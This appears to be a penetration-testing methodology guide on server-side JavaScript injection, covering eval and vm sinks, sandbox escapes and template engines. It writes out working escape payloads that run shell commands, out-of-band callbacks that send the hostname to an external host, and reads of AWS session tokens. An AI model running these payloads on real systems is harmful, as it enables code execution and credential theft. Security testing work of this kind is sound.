---
name: ssji
description: Server-side JavaScript injection — eval-context primitives (Function/eval/AsyncFunction/node:vm), per-runtime sandbox-escape differential (node:vm vs vm2 vs isolated-vm vs QuickJS), template-engine JS sinks, and chains into host RCE
---

# Server-Side JavaScript Injection

Server-Side JavaScript Injection (SSJI) is the class where attacker-controlled text reaches a server-side JavaScript evaluator and runs as code in the host realm. The primitive is **string → JS compiler → host-realm execution**: once a byte of input reaches `Function(code)`, `eval(code)`, `new AsyncFunction(code)`, `vm.runInContext(code, ctx)`, a template-engine JS context, or an "untrusted-code sandbox" that was never a security boundary, the attacker runs JavaScript with the host process's `require`, `process`, `fetch`, and filesystem reach. The question is never "does this evaluate code?" — it is "which guest-to-host primitive does the evaluator leak?"

## Attack Surface

**Direct Evaluators**
- `Function(code)` / `new Function(args..., code)` — compiles a function from a string, runs in host realm; `.constructor.constructor` on any host-realm reference reaches it indirectly
- `eval(code)` — same-realm compilation; `(0, eval)(code)` is indirect-eval but still host-realm in Node
- `new AsyncFunction(code)` — reached via `Object.getPrototypeOf(async function(){}).constructor`, same primitive as Function but returns a Promise
- `node:vm` — `vm.runInContext`, `vm.runInNewContext`, `vm.compileFunction`, `new vm.Script().runIn*` — Node's documentation explicitly says it is **not** a security mechanism; any outer-realm reference leaked into the context is a guest-to-host pivot

**Pseudo-Sandboxes (not security boundaries)**
- `vm2` — EOL in 2023, revived in October 2025, has shipped 20+ sandbox-escape CVEs in 2026; treat as "untrusted-code is unprivileged-user" not "untrusted-code is contained"
- `isolated-vm` — separate V8 Isolate (actual boundary) but has shipped type-confusion in `ExternalCopy` transferList that reaches host memory (see novel sibling)
- `vm-browserify`, `safe-eval`, `node-eval`, `node-safe` — library-level wrappers around `vm` with the same base-tier escape primitive
- `jexl`, `expr-eval`, `mathjs` — JS-expression evaluators sold as "safe"; most expose `.constructor` on parsed-literal objects and reach Function

**Template Engines with JS Contexts**
- Handlebars with `allowProtoMethodsByDefault: true` or helper-registered inline JS — template-source control reaches Function
- Pug/Jade `#{...}` and `-` unbuffered-code blocks compile to inline Function-shaped bodies; template-source control reaches the compiler
- EJS `<%= ... %>` / `<% ... %>` — unbuffered-code blocks compile to a Function body
- Marko `${...}` and `<% ... %>` — same shape
- Mustache / template-literal rendering via `new Function` where developers hand-rolled a renderer

**Runtime Script Injection**
- `document.write` on an SSR path that evaluates emitted script tags on the server (SSR hydration bugs where the "page" is executed server-side)
- Serverless JS runtimes — AWS Lambda custom runtimes that `eval(event.code)`, Cloudflare Workers that compile user-supplied Worker scripts via `new Response(script, { headers: { 'Content-Type': 'application/javascript' }})`, Deno `--allow-run` scripts that `eval` user input
- Build-tool and plugin-config evaluation — `require(usercode)`, `vm.compileFunction(usercode)` in a lint-rule or test-runner plugin

**Input Vectors**
- JSON fields consumed as JS expressions (`$where` in MongoDB legacy — see `nosql_injection.md`; filter DSLs that lower to JS)
- Form/body fields fed into a server-side formula engine
- Webhook/pipeline-definition fields in CI/CD (an n8n Workflow Code node, a Node-RED function node, a Jenkins pipeline `script{}` block)
- Admin-only JS console in self-hosted products ("evaluate" / "custom script" fields) — the privilege boundary is admin→root, so a privileged RCE still counts

## Core Primitive — node:vm Is Not a Security Boundary

Measured on Node v24.19.0 (`.zen-batch-artifacts/batch-14/measure/01-node-vm-escape.output.txt`): a canonical `vm.runInContext` with any outer-realm reference leaked into the context is a host-realm RCE primitive — not a sandbox escape in the "advanced technique" sense, the first thing you try:

```javascript
// Vulnerable pattern — the "evaluate user formula in a vm" idiom
const vm = require('node:vm');
const context = { outsideRef: {} };     // ANY outer-realm object counts
vm.createContext(context);
vm.runInContext(userCode, context);
```
Guest code:
```javascript
outsideRef.constructor.constructor('return this')()
  .process.mainModule.require('child_process')
  .execSync('id').toString();
// → "uid=1000(kali) gid=1000(kali) ..."
```

Why: `outsideRef.constructor` is the host-realm `Object` constructor (the context's prototype chain is rooted in host `Object.prototype`); `.constructor` on `Object` is the host-realm `Function` constructor; `Function('return this')()` returns the host global, which carries `process`. The chain works on **any** leaked reference — a function, an array, a Date, a plain `{}` — because every host object has a `.constructor` property on its prototype chain.

**Even an empty context is not safe.** Measured (`02-node-vm-no-ref.output.txt`): with `context = {}` (no reference leaked), `this.constructor.constructor('return this')()` inside the guest still escapes to the host realm. The sandbox global is itself an outer-realm object; `this` reaches it; `.constructor` reaches host `Object`; the rest of the chain is identical. **`vm.runInContext` with any context object — including an empty one — is a host-realm RCE primitive when the code string is attacker-controlled.** Node's own documentation (`nodejs.org/api/vm.html`) states: "The node:vm module is not a security mechanism. Do not use it to run untrusted code."

The practical implication: there is no `node:vm`-only configuration that makes `runInContext(userCode, ctx)` safe. The containment layer must be below the JS layer — a separate OS process with `child_process.fork` + a seccomp/landlock sandbox, a WebAssembly runtime (`wasmtime`, `wasmer`) that compiles to Wasm instead of V8 bytecode, or a separate V8 Isolate via `isolated-vm` (and even isolated-vm has escapes — see the novel sibling).

## Confirmation Primitive Ladder

Match the signal strength to the sink:

| Rung | Primitive | Observed signal | What it proves |
|---|---|---|---|
| 0 | `7*7` reflected | `49` in response | Expression evaluation (not a template echo) |
| 1 | `typeof process` | `"object"` reflected | Node realm reached (vs browser/QuickJS) |
| 2 | `process.version` | `v24.19.0`-shaped string | Node version fingerprint; can't be faked by a stub |
| 3 | `require('os').hostname()` | actual hostname string | `require` is live + specific host OS reached |
| 4 | `require('child_process').execSync('nslookup $(hostname).xyz.oast.fun')` | DNS hit with hostname label | Host-realm RCE via exec (OAST confirms exec + egress) |
| 5 | `require('child_process').execSync('id')` reflected | `uid=...` output | Host-realm RCE with in-band exfil |
| 6 | Lambda: `process.env.AWS_SESSION_TOKEN` reflected | AWS temp credential prefix | Cloud identity theft; chain to `cloud/aws_metadata.md` |

Start at the lowest rung that fits the sink and climb. A reflected 49 is "evaluator found"; a reflected `uid=1000(kali)` on a header-reaching probe is "finding ready to write up."

## Primitive Expressions

### Function and new Function

The classic SSJI sink. Measured on Node v24.19.0 (`03-function-ctor.output.txt`): `Function('return typeof process')()` returns `"object"` — host-realm `process` reached directly, no sandbox involved. The sinks:

```javascript
Function(userCode)()                    // string compiled, invoked
new Function(userCode)()                // same primitive
new Function('arg', userCode)('val')    // argument-shaped; still arbitrary code
Function.call(null, userCode)()         // called via .call
```

Reached *indirectly* from any object: `({}).constructor.constructor('return this')().process` — same escape chain used in the `node:vm` primitive. This is why "we filter `Function(` in user input" is not a mitigation: `.constructor.constructor` reaches Function without the identifier appearing textually.

### eval

```javascript
eval(userCode)                          // direct-eval; access to caller's scope
(0, eval)(userCode)                     // indirect-eval; runs in global scope
eval.call(null, userCode)               // same as indirect
```
Both forms run attacker code in the host realm. Direct-eval sees the caller's lexical scope (local variable names), which can be an exfil channel on its own; indirect-eval runs in the global scope but still reaches `process`.

### new AsyncFunction

`AsyncFunction` is not exposed as a global on Node; reach it via the prototype chain:
```javascript
const AsyncFn = Object.getPrototypeOf(async function(){}).constructor;
await new AsyncFn('return typeof process')();   // "object"
```
Same primitive as `Function`, returns a Promise. Appears in "safe-eval" implementations that filter `Function` and `eval` identifier strings but leave the async-prototype path open.

### setTimeout(string) / setInterval(string) — NO LONGER A SINK ON NODE 20+

Historically — pre-Node-20 and still in browsers — `setTimeout('code', 0)` was a deferred `eval`. Measured on Node v24.19.0 (`03-function-ctor.output.txt`): `setTimeout('console.log("x")', 0)` throws `TypeError [ERR_INVALID_ARG_TYPE]: The "callback" argument must be of type function. Received type string`. The string-callback form was removed server-side; browser DOM `setTimeout` still accepts strings (per HTML Living Standard). **An SSJI claim that reaches a Node-side `setTimeout(string)` sink on current Node is a false positive** — the sink is rejected before any string compilation. On legacy Node (<20) and in any browser-side SSR path that still uses the DOM `setTimeout`, the primitive survives.

### node:vm and friends

```javascript
vm.runInContext(code, ctx)              // compile + run in ctx; same realm as caller
vm.runInNewContext(code, {})            // same; new context each call
vm.runInThisContext(code)               // compile in current realm, no sandbox pretense
vm.compileFunction(code, [], {parsingContext: ctx})
new vm.Script(code).runInContext(ctx)
new vm.Script(code).runInThisContext()
new vm.SourceTextModule(code).link(...).evaluate()
```
Every form is a guest-to-host primitive because the context cannot hide the `.constructor.constructor` path. The "safe-ish" idiom developers reach for — `vm.runInNewContext(code, Object.create(null))` — only strips the `.constructor` on `this`; a guest that writes `({}).constructor.constructor...` still has `({})` as a host-realm Object literal and escapes anyway (measurable; the empty-context escape above generalizes).

### Dynamic require and import()

```javascript
require(userPath)                       // path control → load any module on the require resolution path
import(userSpecifier)                   // same, dynamic ESM import
```
Not JS *compilation* in the direct sense, but a user-controlled module specifier reaches the loader, and a loaded module runs its top-level body. Catalogued here because the "allowlist of modules" idiom often leaks via path traversal (`../../../../../../tmp/writable.js` after an upload) — route to `path_traversal_lfi_rfi.md` for the containment-check angle and to `prototype_pollution_novel_deep.md § NPM CLI End-to-End Chain` for a documented pollution-reaches-require chain.

## V8-vs-QuickJS-vs-Node-vm Sandbox-Escape Differential

Three JavaScript runtimes meet "server-side JS" workloads with different isolation stories:

| Runtime | Isolation story | Guest-to-host primitive | Safe for untrusted code? |
|---|---|---|---|
| `node:vm` | Same V8 Isolate, "new global object" only | `.constructor.constructor` on any leaked ref (incl. `this`) | No; vendor says so explicitly |
| `vm2` | Same V8 Isolate, Proxy-based "sandbox" with rewritten access | Many — see `ssji_novel_deep.md` for the Jan/May/Aug 2026 CVE wave | No; design is defense-in-breadth, not defense-in-depth |
| `isolated-vm` | Separate V8 Isolate per sandbox (actual boundary) | Memory-corruption class — see `ssji_novel_deep.md § isolated-vm ExternalCopy TOCTOU` | Yes-ish, with caveats |
| `quickjs` / `quickjs-emscripten` | Separate interpreter + heap | No shared V8 primitives; escapes require interpreter bugs | Yes for ES-level isolation; still unsafe for CPU/memory DoS |
| WebAssembly (`wasmtime`, `wasmer`) | Separate Wasm runtime, no JS compile | No path to host JS at all | Yes — but no `require`, no `fs`, no `fetch` without explicit host bindings |

The practical mapping: **"isolated-vm or process-fork is the safe default. node:vm and vm2 are not sandboxes."** This is a methodology point, not a technique — route to the novel sibling for the per-library escape primitives on current versions.

## Template-Engine JS Contexts

Template engines that *compile* templates to JS (Handlebars, Pug, EJS, Marko) have a server-side JS compile step. Template-source control is JS-compile control. The primitive is not "SSTI" in the string-interpolation sense — it is **template bytes → compiled JS function body**, same host-realm reach as `Function(userCode)`.

Where template sources become attacker-controlled:
- A multi-tenant SaaS that stores per-tenant templates in a database and compiles them on render — "edit email template" is a Function-constructor sink
- A reporting tool that lets users paste a Handlebars template; the server compiles it before rendering
- A plugin/extension system where plugin manifests include template bodies

The confirmation is the same `.constructor.constructor` chain inside a template helper or an unbuffered-code block. For Pug: `- const F = ({}).constructor.constructor; - const r = F('return this')().process.mainModule.require('child_process').execSync('id').toString(); = r`. For EJS: `<%= ({}).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id').toString() %>`. Route to `ssti.md` for the per-engine syntax catalogue; this file owns the primitive-is-same observation.

## Detection Channels

### Reflected Oracle

The strongest signal: inject an expression whose output is reflected and distinct from any constant.
```javascript
// Payload families
7*7                       // → 49 reflected
process.version           // → "v24.x" string reflected
process.platform          // → "linux" / "darwin" / "win32"
require('os').hostname()  // → the actual hostname string
```
Reflected `49` from a `7*7` input distinguishes JS evaluation from printf/format-string interpolation (which would reflect `"7*7"` literally). `process.version` reflected confirms **Node.js**, specifically — a QuickJS runtime does not have `process.version`.

### OAST / Out-of-Band

When nothing is reflected:
```javascript
require('child_process').execSync('nslookup $(hostname).xyz.oast.fun')
require('http').get('http://xyz.oast.fun/' + require('os').hostname())
fetch('https://xyz.oast.fun/' + process.env.HOSTNAME)   // Node 18+ or browser-side
```
Pair with `interactsh-client -v` for the callback. A DNS hit with a hostname label resolved to the target's actual hostname proves JS execution ran and `os.hostname()` was computed inside the eval context — see `rce.md § Confirmation-Primitive Ladder` for level-matching.

### Time-Based

```javascript
require('child_process').execSync('sleep 5')           // Unix
await new Promise(r => setTimeout(r, 5000))            // works where child_process is blocked
Date.now() + '|' + (function(){ while(Date.now()-t<5000); return 'done'; })()
```
The busy-wait form works even in a "no built-ins" sandbox context — if the guest can run arithmetic and loops, it can burn wall-clock time. A 5-second response delta against a baseline is confirmation.

### Error-Based Oracle

A thrown error on an untrusted path often prints the stack with filename, line, and sometimes the compiled source:
```javascript
throw new Error('x')                   // check for sandbox-vs-caller stack frames in response
undefinedIdent                         // ReferenceError if evaluated as JS, pass-through if treated as a literal
```
`throw` echoing the stack confirms the compiler ran and the frame is in the sandbox context; "ReferenceError: undefinedIdent is not defined" confirms the code was parsed and executed.

## Testing Methodology

1. **Identify the sink.** Grep for `Function(`, `new Function`, `eval(`, `vm.run`, `vm.compileFunction`, `new vm.Script`, `require(` with a non-constant specifier, `import(` dynamic, `.compile(` on a template engine, `AsyncFunction`, and `jexl.eval` / `expr-eval.eval` / `mathjs.evaluate` call sites. A sink without an input path is the first precondition.
2. **Trace input to the sink.** Any user-controlled field feeding the sink string without a `Function.prototype.toString`-safe allowlist (not a `replace()` of specific identifiers) is a candidate. Note that `.replace(/eval/g, '')` is defeated by `({}).constructor.constructor` reaching Function without `eval` appearing in the input.
3. **Fire the primitive expression ladder.** `7*7` → `process.version` → `require('os').hostname()` → `require('child_process').execSync('id')`. Each step moves up a rung and confirms a specific capability — expression-eval → Node realm → child-process reach.
4. **Confirm realm leak.** `typeof process` returns `'object'` in the Node realm, `'undefined'` in a browser or a QuickJS runtime. `typeof require` returns `'function'` in CommonJS Node, `'undefined'` in ESM-only or non-Node. These distinguish the runtime.
5. **Verify host reach.** Where `require('child_process').execSync` is available, the primitive is host RCE. Where it is blocked (an actual sandbox like `isolated-vm` with no `child_process` binding), the primitive is bounded to in-isolate work — read the isolate's loaded modules, extract secrets accessible to the loaded module graph, exfil via `fetch` or an injected network binding.
6. **Capture a signal appropriate to the sink.** Reflected > OAST > time-based. The strongest signal that survives WAFs is a reflected `require('os').hostname()` that returns the actual hostname — printf-shaped sinks cannot fake it.

## Validation

A finding is SSJI only if:
- **Reflected eval signal matches the input.** `7*7` input returns `49`, not `"7*7"`. Any sink that reflects `"7*7"` literally is a template or printf sink, not a JS evaluator.
- **Runtime-identifier primitive succeeds.** `process.version` (Node), `Deno.version` (Deno), `typeof window` (browser-side SSR) returns a plausible value — not `undefined` and not a sanitized string.
- **The sink is attacker-reachable.** Admin-only `/execute` endpoints are still findings, but the privilege gate is part of the write-up.
- **The runtime matches the primitive.** A Function-constructor primitive against QuickJS fails because QuickJS does not expose `process`; a `node:vm` primitive against Cloudflare Workers fails because Workers run in a V8 Isolate without `node:vm`. Match the runtime fingerprint before claiming reach.

## False Positives

- **Printf/format-string interpolation** (`%s`, `{{name}}`, `${name}` in a non-compiling template) that reflects `"7*7"` as-is. Not SSJI; see `xss.md` for the template-side variants.
- **JSON-stringified input echoed in a response.** If `"7*7"` returns as `"\"7*7\""` in a JSON blob, the sink is a serializer, not an evaluator.
- **A Content-Type: application/javascript response that *references* the input but does not evaluate it server-side.** Browser-side execution of the response is XSS, not SSJI.
- **Formula engines with a bounded grammar** (`expr-eval` with no `.constructor` path exposed by the AST; `mathjs` with `.evaluate` and a strict parser rejecting non-numeric nodes). Verify by reading the parser — many "safe" engines leak via member-access on parsed-literal objects.
- **A SQL-shaped `$where` string in Mongo** that evaluates server-side but is bounded to the document scope. The primitive exists but routes to `nosql_injection.md § Mongoose $where RCE Chain`, which owns the mechanism — mention SSJI as a label only.
- **`setTimeout(string)` on Node 20+**. Measured non-sink. On legacy Node (<20) or in a browser SSR path, re-check.

## Impact and Chaining

**Direct impact.** Host-realm JS execution means `require('child_process').execSync` on anything the Node process can shell out to — OS command execution, filesystem reach via `require('fs')`, outbound HTTP via `require('http')`/`fetch`, environment-variable reach via `process.env` (secrets, API keys, DB URLs). On a serverless function with execution-role credentials in `process.env.AWS_ACCESS_KEY_ID` / `process.env.AWS_SESSION_TOKEN`, SSJI is immediate cloud-identity theft — route credential-extraction specifics to `cloud/aws_metadata.md` or the equivalent provider file.

**Upstream enablers (what grants SSJI).**
- **Prototype pollution** → polluting `Object.prototype.shell` or a config key that reaches a `Function(code)` sink. `prototype_pollution_novel_deep.md § NPM CLI End-to-End Chain` and `§ child_process — Cross-Platform NODE_OPTIONS CDP Gadget` document the pollution-reaches-exec primitives.
- **Deserialization** of a crafted object whose reconstructor reaches `vm.runInContext` or `Function.prototype.apply` with attacker data — see `insecure_deserialization.md § Node.js Gadget Classes`.
- **SSRF** reaching an internal "code-execution" admin endpoint that is CSRF-protected on the public edge but not internally — route to `ssrf.md`.
- **File upload** of a `.js` file that is `require()`d by a plugin loader — route to `insecure_file_uploads.md`.

**Downstream (what SSJI grants).**
- `rce.md` — host OS command execution, post-exploitation (persistence, lateral movement, process reach).
- `insecure_deserialization.md` — a host-realm Function constructor is a universal gadget for any deserialization that terminates at a JS eval sink.
- `prototype_pollution.md` — the inverse: SSJI can mutate `Object.prototype` from inside the eval, polluting every subsequent request in a long-running Node process (persistence of pollution across the server lifetime).
- `information_disclosure.md` — `process.env` dump, source-code dump via `require.cache`, in-memory secret extraction.

**Composite chains (reachability only).**
- *Prototype pollution → Function compile.* An uploaded config polluting `Object.prototype.cmd`; a downstream `template.compile(opts)` where `opts.cmd` reaches a Function body. The pollution granted the primitive; SSJI chains it to host exec. Route: `prototype_pollution.md` (pollution) → this file (compile) → `rce.md` (exec).
- *Upload → require.* An unauthenticated upload places `evil.js` at a plugin-loader scan path; a scheduled job `require()`s discovered plugins. Route: `insecure_file_uploads.md` (upload) → this file (dynamic require) → `rce.md`.
- *SSJI → cloud credentials.* `process.env` enumeration dumps AWS session credentials from the Lambda execution role. Route: this file (reach `process.env`) → `cloud/aws_metadata.md` (credential handling).

## Pro Tips

- **Fingerprint the runtime first, not the sink.** `process.version` vs `Deno.version` vs neither tells you which host-realm primitives are available before you commit to a payload class.
- **The `.constructor.constructor` chain is universal and filter-resistant.** Filters that strip `eval`, `Function`, `require`, and `process` as identifier strings still leak through `.constructor.constructor` because the identifier `constructor` is semantic, not textual — bodies filter it via `.replace(/constructor/g, '')` only, and `['constructor']` bracket-access defeats that.
- **Empty-context `vm.runInContext` escapes.** Measured. Code reviews that approve `vm.runInNewContext(code, {})` as "safer than eval" are approving the same primitive at a different method name.
- **Node 20+ removed string-callback `setTimeout`.** If your pre-20 payload set used `setTimeout('cmd', 0)` on a modern target, it will throw `ERR_INVALID_ARG_TYPE` before execution. Prefer `Function` / `eval` / `AsyncFunction` on modern Node.
- **Admin-only JS fields still count.** An authenticated-admin "run a script" field without logging/audit is a persistence and lateral-movement primitive, and the privilege boundary is part of the finding, not an excuse for not writing it up.
- **A `vm2` CVE from 2024 is almost certainly obsolete.** vm2 was EOL from May 2023 and revived in October 2025; the actively exploited class is the 2026 wave. See `ssji_novel_deep.md` for the live catalog and version mapping.
- **Serverless `process.env` is cloud-identity theft, not just a secret leak.** SSJI on Lambda or Cloud Functions pivots to the execution-role identity on the next line of attacker-authored code — the finding is "cloud identity compromised," not "env var disclosed."

## Tooling

- **Burp Suite** — Scanner picks up classic eval sinks via `${...}`-style reflections; extensions `backslash-powered-scanner` and `active-scan++` add JS-eval probe families.
- **Semgrep** — `javascript.lang.security.detect-eval`, `javascript.express.security.audit.injection-of-custom-headers`, and the Function-constructor rules under `javascript.lang.security.audit` catch sink patterns in a repo.
- **CodeQL** — `js/code-injection`, `js/unsafe-dynamic-method-access` cover direct and indirect sinks; add a flow source for request fields reaching Function/eval.
- **Node 20+ `--experimental-vm-modules` / `--permission`** — not a defense, a verification knob: with permissions enabled, a host-reach from SSJI will throw an `ERR_ACCESS_DENIED` that lets you observe the escape attempt.
- **`isolated-vm` / `node:vm`** — spin up a local sandbox and run the primitive expression ladder against it to confirm the runtime fingerprint matches the target.
- **`node --inspect-brk`** — attach Chrome DevTools to a running Node process and watch what the eval body does; the fastest way to confirm host-realm reach without network exfil.

## Summary

SSJI is a server-side JavaScript evaluator reached from user input, and the primitive is **string → compile → host-realm execution**. The direct sinks are `Function` / `new Function` / `eval` / `new AsyncFunction` / `node:vm`-family; `setTimeout(string)` was retired on Node 20+. The confirmation ladder is `7*7` → `process.version` → `require('os').hostname()` → `require('child_process').execSync('id')`, matched to the runtime fingerprint (Node vs Deno vs QuickJS vs browser SSR). `node:vm.runInContext` is not a sandbox — measured on Node 24.19.0, it escapes to host even with an empty context, because `this.constructor.constructor` reaches the host Function. The two deep siblings carry the full technique surface: `ssji_advanced_deep.md` owns the per-stack primitives (vm/vm2/isolated-vm escape history, template-engine JS contexts, serverless, QuickJS internals), and `ssji_novel_deep.md` owns the 2024–2026 CVE catalog (vm2 Jan/May/Aug 2026 wave with the vm2-is-not-EOL correction, isolated-vm `ExternalCopy` TOCTOU, Hoppscotch CVE-2024-34347, n8n CVE-2025-68613, Claude TS SDK CVE-2026-34451).
